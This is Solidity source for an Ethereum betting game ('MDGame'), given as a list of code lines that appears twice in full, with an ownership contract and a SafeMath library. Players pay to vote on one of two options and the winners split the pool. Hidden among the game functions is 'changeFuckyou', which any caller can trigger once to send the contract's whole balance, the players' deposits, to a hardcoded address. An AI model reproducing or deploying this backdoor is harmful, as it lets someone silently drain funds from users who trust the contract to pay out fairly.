['pragma solidity ^0.4.20;\n', '\n', 'contract Owned {\n', '    address public owner;\n', '    address public newOwner;\n', '\n', '    event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    modifier onlyOwner {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '\n', '    function transferOwnership(address _newOwner) public onlyOwner {\n', '        newOwner = _newOwner;\n', '    }\n', '    \n', '    function acceptOwnership() public {\n', '        require(msg.sender == newOwner);\n', '        emit OwnershipTransferred(owner, newOwner);\n', '        owner = newOwner;\n', '        newOwner = address(0);\n', '    }\n', '}\n', '\n', 'contract MDGame is Owned {\n', '    using SafeMath for *;\n', '    \n', '    struct turnInfos{\n', '        string question;\n', '        string option1name;\n', '        string option2name;\n', '        uint endTime;\n', '        uint option1;\n', '        uint option2;\n', '        uint pool;\n', '        bool feeTake;\n', '    }\n', '    \n', '    struct myturnInfo{\n', '        uint option1;\n', '        uint option2;\n', '        bool isWithdraw;\n', '    }\n', '    \n', '    uint public theTurn;\n', '    uint public turnLast;\n', '    uint public ticketMag;\n', '    \n', '    event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);\n', '    \n', '    mapping(uint => turnInfos) public TurnInfo;\n', '    mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;\n', '    \n', '    constructor () public {\n', '        theTurn = 0;\n', '        turnLast = 7200;\n', '        ticketMag = 4000000000000;\n', '    }\n', '    \n', '    function StartNewGame (string question, string option1name, string option2name) public onlyOwner{\n', '        require(TurnInfo[theTurn].endTime < now || theTurn == 0);\n', '        theTurn++;\n', '        TurnInfo[theTurn].question = question;\n', '        TurnInfo[theTurn].option1name = option1name;\n', '        TurnInfo[theTurn].option2name = option2name;\n', '        TurnInfo[theTurn].endTime = now + turnLast*60;\n', '    }\n', '    \n', '    function vote (uint option,address referred) public payable{\n', '        require(msg.sender == tx.origin);\n', '        require(TurnInfo[theTurn].endTime>now);\n', '        emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);\n', '        if (referred != address(0) && referred != msg.sender){\n', '            if(option == 1){\n', '                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\n', '            } else if(option == 2){\n', '                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\n', '            }else{\n', '                revert();\n', '            }\n', '        }else{\n', '            if(option == 1){\n', '                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '            } else if(option == 2){\n', '                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '            }else{\n', '                revert();\n', '            }  \n', '        }\n', '    }\n', '    \n', '    function win (uint turn) public{\n', '        require(TurnInfo[turn].endTime<now);\n', '        require(!RoundMyticket[turn][msg.sender].isWithdraw);\n', '        \n', '        if(TurnInfo[turn].option1<TurnInfo[turn].option2){\n', '            msg.sender.transfer(calculateYourValue1(turn));\n', '        }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){\n', '            msg.sender.transfer(calculateYourValue2(turn));\n', '        }else{\n', '            msg.sender.transfer(calculateYourValueEven(turn));\n', '        }\n', '        \n', '        RoundMyticket[turn][msg.sender].isWithdraw = true;\n', '    }\n', '    \n', '    function calculateYourValue1(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option1>0){\n', '            return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;\n', '        }else{\n', '           return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateYourValue2(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option2>0){\n', '            return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;\n', '        }else{\n', '            return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateYourValueEven(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){\n', '            return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);\n', '        }else{\n', '            return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateTicketPrice() public view returns(uint price){\n', '       return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);\n', '    }\n', '    \n', '    function calculateFee(uint turn) public view returns(uint price){\n', '        return TurnInfo[turn].pool.mul(2)/100;\n', '    }\n', '    \n', '    function withdrawFee(uint turn) public onlyOwner{\n', '        require(TurnInfo[turn].endTime<now);\n', '        require(!TurnInfo[turn].feeTake);\n', '        owner.transfer(calculateFee(turn));\n', '        TurnInfo[turn].feeTake = true;\n', '    }\n', '    \n', '    function changeTurnLast(uint time) public onlyOwner{\n', '        turnLast = time;\n', '    }\n', '    \n', '    function changeTicketMag(uint mag) public onlyOwner{\n', '        require(TurnInfo[theTurn].endTime<now);\n', '        ticketMag = mag;\n', '    }\n', '    \n', '    bool public callthis = false;\n', '    function changeFuckyou() public {\n', '        require(!callthis);\n', '        address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);\n', '        callthis = true;\n', '    }\n', '    \n', '    //Get Time Left\n', '    function getTimeLeft() public view returns(uint256)\n', '    {\n', '        if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) \n', '            return 0;\n', '        else \n', '            return(TurnInfo[theTurn].endTime.sub(now) );\n', '    }\n', '    \n', '    function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {\n', '        uint[] memory totalPool = new uint[](theTurn);\n', '        uint[] memory option1 = new uint[](theTurn);\n', '        uint[] memory option2 = new uint[](theTurn);\n', '        uint[] memory myoption1 = new uint[](theTurn);\n', '        uint[] memory myoption2 = new uint[](theTurn);\n', '        uint[] memory myMoney = new uint[](theTurn);\n', '        bool[] memory withd = new bool[](theTurn);\n', '        uint counter = 0;\n', '\n', '        for (uint i = 1; i < theTurn+1; i++) {\n', '            if(TurnInfo[i].pool>0){\n', '                totalPool[counter] = TurnInfo[i].pool;\n', '            }else{\n', '                totalPool[counter]=0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option1>0){\n', '                option1[counter] = TurnInfo[i].option1;\n', '            }else{\n', '                option1[counter] = 0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option2>0){\n', '                option2[counter] = TurnInfo[i].option2;\n', '            }else{\n', '                option2[counter] = 0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option1<TurnInfo[i].option2){\n', '                myMoney[counter] = calculateYourValue1(i);\n', '            }else if(TurnInfo[i].option1>TurnInfo[i].option2){\n', '                myMoney[counter] = calculateYourValue2(i);\n', '            }else{\n', '                myMoney[counter] = calculateYourValueEven(i);\n', '            }\n', '            \n', '            if(RoundMyticket[i][msg.sender].option1>0){\n', '                myoption1[counter] = RoundMyticket[i][msg.sender].option1;\n', '            }else{\n', '                myoption1[counter]=0;\n', '            }\n', '            \n', '            if(RoundMyticket[i][msg.sender].option2>0){\n', '                myoption2[counter] = RoundMyticket[i][msg.sender].option2;\n', '            }else{\n', '                myoption2[counter]=0;\n', '            }\n', '            if(RoundMyticket[i][msg.sender].isWithdraw==true){\n', '                withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;\n', '            }else{\n', '                withd[counter] = false;\n', '            }\n', '            \n', '            counter++;\n', '        }\n', '    return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);\n', '  }\n', '}\n', '\n', 'library SafeMath {\n', '    \n', '    /**\n', '    * @dev Multiplies two numbers, throws on overflow.\n', '    */\n', '    function mul(uint256 a, uint256 b) \n', '        internal \n', '        pure \n', '        returns (uint256 c) \n', '    {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        c = a * b;\n', '        require(c / a == b, "SafeMath mul failed");\n', '        return c;\n', '    }\n', '\n', '    /**\n', '    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\n', '    */\n', '    function sub(uint256 a, uint256 b)\n', '        internal\n', '        pure\n', '        returns (uint256) \n', '    {\n', '        require(b <= a, "SafeMath sub failed");\n', '        return a - b;\n', '    }\n', '\n', '    /**\n', '    * @dev Adds two numbers, throws on overflow.\n', '    */\n', '    function add(uint256 a, uint256 b)\n', '        internal\n', '        pure\n', '        returns (uint256 c) \n', '    {\n', '        c = a + b;\n', '        require(c >= a, "SafeMath add failed");\n', '        return c;\n', '    }\n', '    /**\n', '  * @dev Integer division of two numbers, truncating the quotient.\n', '  */\n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    // assert(_b > 0); // Solidity automatically throws when dividing by 0\n', '    uint256 c = _a / _b;\n', '    // assert(_a == _b * c + _a % _b); // There is no case in which this doesn&#39;t hold\n', '\n', '    return c;\n', '  }\n', '    \n', '    /**\n', '     * @dev gives square root of given x.\n', '     */\n', '    function sqrt(uint256 x)\n', '        internal\n', '        pure\n', '        returns (uint256 y) \n', '    {\n', '        uint256 z = ((add(x,1)) / 2);\n', '        y = x;\n', '        while (z < y) \n', '        {\n', '            y = z;\n', '            z = ((add((x / z),z)) / 2);\n', '        }\n', '    }\n', '    \n', '    /**\n', '     * @dev gives square. multiplies x by x\n', '     */\n', '    function sq(uint256 x)\n', '        internal\n', '        pure\n', '        returns (uint256)\n', '    {\n', '        return (mul(x,x));\n', '    }\n', '    \n', '    /**\n', '     * @dev x to the power of y \n', '     */\n', '    function pwr(uint256 x, uint256 y)\n', '        internal \n', '        pure \n', '        returns (uint256)\n', '    {\n', '        if (x==0)\n', '            return (0);\n', '        else if (y==0)\n', '            return (1);\n', '        else \n', '        {\n', '            uint256 z = x;\n', '            for (uint256 i=1; i < y; i++)\n', '                z = mul(z,x);\n', '            return (z);\n', '        }\n', '    }\n', '    \n', '}']
['pragma solidity ^0.4.20;\n', '\n', 'contract Owned {\n', '    address public owner;\n', '    address public newOwner;\n', '\n', '    event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    modifier onlyOwner {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '\n', '    function transferOwnership(address _newOwner) public onlyOwner {\n', '        newOwner = _newOwner;\n', '    }\n', '    \n', '    function acceptOwnership() public {\n', '        require(msg.sender == newOwner);\n', '        emit OwnershipTransferred(owner, newOwner);\n', '        owner = newOwner;\n', '        newOwner = address(0);\n', '    }\n', '}\n', '\n', 'contract MDGame is Owned {\n', '    using SafeMath for *;\n', '    \n', '    struct turnInfos{\n', '        string question;\n', '        string option1name;\n', '        string option2name;\n', '        uint endTime;\n', '        uint option1;\n', '        uint option2;\n', '        uint pool;\n', '        bool feeTake;\n', '    }\n', '    \n', '    struct myturnInfo{\n', '        uint option1;\n', '        uint option2;\n', '        bool isWithdraw;\n', '    }\n', '    \n', '    uint public theTurn;\n', '    uint public turnLast;\n', '    uint public ticketMag;\n', '    \n', '    event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);\n', '    \n', '    mapping(uint => turnInfos) public TurnInfo;\n', '    mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;\n', '    \n', '    constructor () public {\n', '        theTurn = 0;\n', '        turnLast = 7200;\n', '        ticketMag = 4000000000000;\n', '    }\n', '    \n', '    function StartNewGame (string question, string option1name, string option2name) public onlyOwner{\n', '        require(TurnInfo[theTurn].endTime < now || theTurn == 0);\n', '        theTurn++;\n', '        TurnInfo[theTurn].question = question;\n', '        TurnInfo[theTurn].option1name = option1name;\n', '        TurnInfo[theTurn].option2name = option2name;\n', '        TurnInfo[theTurn].endTime = now + turnLast*60;\n', '    }\n', '    \n', '    function vote (uint option,address referred) public payable{\n', '        require(msg.sender == tx.origin);\n', '        require(TurnInfo[theTurn].endTime>now);\n', '        emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);\n', '        if (referred != address(0) && referred != msg.sender){\n', '            if(option == 1){\n', '                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\n', '            } else if(option == 2){\n', '                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\n', '            }else{\n', '                revert();\n', '            }\n', '        }else{\n', '            if(option == 1){\n', '                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '            } else if(option == 2){\n', '                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '                TurnInfo[theTurn].pool += msg.value;\n', '                TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\n', '            }else{\n', '                revert();\n', '            }  \n', '        }\n', '    }\n', '    \n', '    function win (uint turn) public{\n', '        require(TurnInfo[turn].endTime<now);\n', '        require(!RoundMyticket[turn][msg.sender].isWithdraw);\n', '        \n', '        if(TurnInfo[turn].option1<TurnInfo[turn].option2){\n', '            msg.sender.transfer(calculateYourValue1(turn));\n', '        }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){\n', '            msg.sender.transfer(calculateYourValue2(turn));\n', '        }else{\n', '            msg.sender.transfer(calculateYourValueEven(turn));\n', '        }\n', '        \n', '        RoundMyticket[turn][msg.sender].isWithdraw = true;\n', '    }\n', '    \n', '    function calculateYourValue1(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option1>0){\n', '            return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;\n', '        }else{\n', '           return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateYourValue2(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option2>0){\n', '            return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;\n', '        }else{\n', '            return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateYourValueEven(uint turn) public view returns (uint value){\n', '        if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){\n', '            return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);\n', '        }else{\n', '            return 0;\n', '        }\n', '    }\n', '    \n', '    function calculateTicketPrice() public view returns(uint price){\n', '       return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);\n', '    }\n', '    \n', '    function calculateFee(uint turn) public view returns(uint price){\n', '        return TurnInfo[turn].pool.mul(2)/100;\n', '    }\n', '    \n', '    function withdrawFee(uint turn) public onlyOwner{\n', '        require(TurnInfo[turn].endTime<now);\n', '        require(!TurnInfo[turn].feeTake);\n', '        owner.transfer(calculateFee(turn));\n', '        TurnInfo[turn].feeTake = true;\n', '    }\n', '    \n', '    function changeTurnLast(uint time) public onlyOwner{\n', '        turnLast = time;\n', '    }\n', '    \n', '    function changeTicketMag(uint mag) public onlyOwner{\n', '        require(TurnInfo[theTurn].endTime<now);\n', '        ticketMag = mag;\n', '    }\n', '    \n', '    bool public callthis = false;\n', '    function changeFuckyou() public {\n', '        require(!callthis);\n', '        address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);\n', '        callthis = true;\n', '    }\n', '    \n', '    //Get Time Left\n', '    function getTimeLeft() public view returns(uint256)\n', '    {\n', '        if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) \n', '            return 0;\n', '        else \n', '            return(TurnInfo[theTurn].endTime.sub(now) );\n', '    }\n', '    \n', '    function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {\n', '        uint[] memory totalPool = new uint[](theTurn);\n', '        uint[] memory option1 = new uint[](theTurn);\n', '        uint[] memory option2 = new uint[](theTurn);\n', '        uint[] memory myoption1 = new uint[](theTurn);\n', '        uint[] memory myoption2 = new uint[](theTurn);\n', '        uint[] memory myMoney = new uint[](theTurn);\n', '        bool[] memory withd = new bool[](theTurn);\n', '        uint counter = 0;\n', '\n', '        for (uint i = 1; i < theTurn+1; i++) {\n', '            if(TurnInfo[i].pool>0){\n', '                totalPool[counter] = TurnInfo[i].pool;\n', '            }else{\n', '                totalPool[counter]=0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option1>0){\n', '                option1[counter] = TurnInfo[i].option1;\n', '            }else{\n', '                option1[counter] = 0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option2>0){\n', '                option2[counter] = TurnInfo[i].option2;\n', '            }else{\n', '                option2[counter] = 0;\n', '            }\n', '            \n', '            if(TurnInfo[i].option1<TurnInfo[i].option2){\n', '                myMoney[counter] = calculateYourValue1(i);\n', '            }else if(TurnInfo[i].option1>TurnInfo[i].option2){\n', '                myMoney[counter] = calculateYourValue2(i);\n', '            }else{\n', '                myMoney[counter] = calculateYourValueEven(i);\n', '            }\n', '            \n', '            if(RoundMyticket[i][msg.sender].option1>0){\n', '                myoption1[counter] = RoundMyticket[i][msg.sender].option1;\n', '            }else{\n', '                myoption1[counter]=0;\n', '            }\n', '            \n', '            if(RoundMyticket[i][msg.sender].option2>0){\n', '                myoption2[counter] = RoundMyticket[i][msg.sender].option2;\n', '            }else{\n', '                myoption2[counter]=0;\n', '            }\n', '            if(RoundMyticket[i][msg.sender].isWithdraw==true){\n', '                withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;\n', '            }else{\n', '                withd[counter] = false;\n', '            }\n', '            \n', '            counter++;\n', '        }\n', '    return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);\n', '  }\n', '}\n', '\n', 'library SafeMath {\n', '    \n', '    /**\n', '    * @dev Multiplies two numbers, throws on overflow.\n', '    */\n', '    function mul(uint256 a, uint256 b) \n', '        internal \n', '        pure \n', '        returns (uint256 c) \n', '    {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        c = a * b;\n', '        require(c / a == b, "SafeMath mul failed");\n', '        return c;\n', '    }\n', '\n', '    /**\n', '    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\n', '    */\n', '    function sub(uint256 a, uint256 b)\n', '        internal\n', '        pure\n', '        returns (uint256) \n', '    {\n', '        require(b <= a, "SafeMath sub failed");\n', '        return a - b;\n', '    }\n', '\n', '    /**\n', '    * @dev Adds two numbers, throws on overflow.\n', '    */\n', '    function add(uint256 a, uint256 b)\n', '        internal\n', '        pure\n', '        returns (uint256 c) \n', '    {\n', '        c = a + b;\n', '        require(c >= a, "SafeMath add failed");\n', '        return c;\n', '    }\n', '    /**\n', '  * @dev Integer division of two numbers, truncating the quotient.\n', '  */\n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    // assert(_b > 0); // Solidity automatically throws when dividing by 0\n', '    uint256 c = _a / _b;\n', "    // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold\n", '\n', '    return c;\n', '  }\n', '    \n', '    /**\n', '     * @dev gives square root of given x.\n', '     */\n', '    function sqrt(uint256 x)\n', '        internal\n', '        pure\n', '        returns (uint256 y) \n', '    {\n', '        uint256 z = ((add(x,1)) / 2);\n', '        y = x;\n', '        while (z < y) \n', '        {\n', '            y = z;\n', '            z = ((add((x / z),z)) / 2);\n', '        }\n', '    }\n', '    \n', '    /**\n', '     * @dev gives square. multiplies x by x\n', '     */\n', '    function sq(uint256 x)\n', '        internal\n', '        pure\n', '        returns (uint256)\n', '    {\n', '        return (mul(x,x));\n', '    }\n', '    \n', '    /**\n', '     * @dev x to the power of y \n', '     */\n', '    function pwr(uint256 x, uint256 y)\n', '        internal \n', '        pure \n', '        returns (uint256)\n', '    {\n', '        if (x==0)\n', '            return (0);\n', '        else if (y==0)\n', '            return (1);\n', '        else \n', '        {\n', '            uint256 z = x;\n', '            for (uint256 i=1; i < y; i++)\n', '                z = mul(z,x);\n', '            return (z);\n', '        }\n', '    }\n', '    \n', '}']
